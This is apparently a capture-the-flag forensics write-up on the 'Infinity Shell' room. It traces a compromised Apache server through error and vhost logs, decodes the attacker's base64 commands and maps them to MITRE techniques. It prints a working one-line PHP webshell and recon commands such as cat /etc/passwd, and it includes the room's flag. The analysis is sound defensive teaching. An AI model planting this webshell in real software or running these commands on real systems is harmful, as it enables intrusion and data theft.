Infinity Shell — Forensics Writeup

⸻

1. Objective

Investigate a compromised web server, identify malicious activity, locate persistence mechanisms, and reconstruct attacker actions.

⸻

2. Initial Findings (Error Logs)

Location:

/var/log/apache2/error.log.1

Key observations
	•	Repeated errors referencing:

/var/www/html/CMSsite-master/img/images.php

	•	Indicators:

system(): Argument #1 ($command) cannot be empty
Undefined array key "query"

Analysis
	•	Presence of system() → command execution
	•	Parameter query → user-controlled input
	•	Located in /img/ → suspicious (should not contain PHP)

👉 Initial hypothesis: webshell activity

⸻

3. Identifying the Webshell

File:

/var/www/html/CMSsite-master/img/images.php

Contents

<?php system(base64_decode($_GET['query'])); ?>

Analysis
	•	Accepts input via GET['query']
	•	Decodes Base64
	•	Executes command using system()

👉 Confirmed: Remote Code Execution (RCE) webshell

⸻

4. File Metadata Analysis

stat images.php

Key timestamps
	•	Created/Modified:

2025-03-06 09:50:32

Correlation
	•	Error logs show execution immediately after

👉 Indicates:
	•	File uploaded
	•	Used instantly

⸻

5. Logging Gap Investigation

Observed:

access.log → empty

Discovery

/var/log/apache2/other_vhosts_access.log.1

👉 Actual request logs stored here (virtual host logging)

⸻

6. Extracting Attacker Activity

Command:

grep "images.php" other_vhosts_access.log.1

Captured Requests

GET /img/images.php?query=<base64>


⸻

7. Decoding Attacker Commands

Commands observed

Encoded	Decoded
d2hvYW1pCg==	whoami
bHMK	ls
ZWNoby…	echo ‘THM{sup3r_34sy_w3bsh3ll}’
aWZjb25maWcK	ifconfig
Y2F0IC9ldGMvcGFzc3dkCg==	cat /etc/passwd
aWQK	id


⸻

8. Attack Timeline

Time	Action
09:50:32	Webshell uploaded
09:50:57	whoami
09:51:11	ls
09:51:20	echo (flag)
09:51:28	ifconfig
09:51:40	cat /etc/passwd
09:51:47	id


⸻

9. Attacker Behavior Analysis

Stage: Post-Exploitation

Command	Purpose
whoami	Verify execution
ls	File enumeration
echo	Validation / flag
ifconfig	Network reconnaissance
cat /etc/passwd	User enumeration
id	Privilege check


⸻

10. Source Identification

From logs:

Client IP: 10.11.93.143
User-Agent: Chrome (Mac)


⸻

11. Root Cause

Likely vulnerability:
	•	File upload or inclusion flaw in CMS
	•	Allowed execution of arbitrary PHP file

⸻

12. Indicators of Compromise (IOCs)
	•	File:

/img/images.php

	•	Patterns:

system(base64_decode($_GET

	•	Logs:

query=
base64 payloads

	•	IP:

10.11.93.143


⸻

13. Security Impact
	•	Remote Code Execution (RCE)
	•	Arbitrary command execution
	•	Information disclosure
	•	Potential privilege escalation

⸻

14. MITRE ATT&CK Mapping

Technique	Description
T1505.003	Web Shell
T1059	Command Execution
T1082	System Information Discovery
T1018	Network Discovery
T1087	Account Discovery


⸻

15. Remediation
	•	Remove malicious file
	•	Disable execution in upload directories
	•	Restrict PHP functions (system, exec)
	•	Enable proper logging
	•	Validate file uploads
	•	Apply WAF rules

⸻

16. Key Lessons
	•	Webshells often hide in legitimate directories (img/, uploads/)
	•	Base64 is commonly used to evade detection
	•	Logs may not always be where expected
	•	Error logs can reveal exploitation even without access logs

⸻

17. Final Conclusion

A webshell was successfully deployed and used to execute commands on the server. Through log analysis, file inspection, and payload decoding, the full attack lifecycle was reconstructed, confirming a successful compromise and post-exploitation activity.

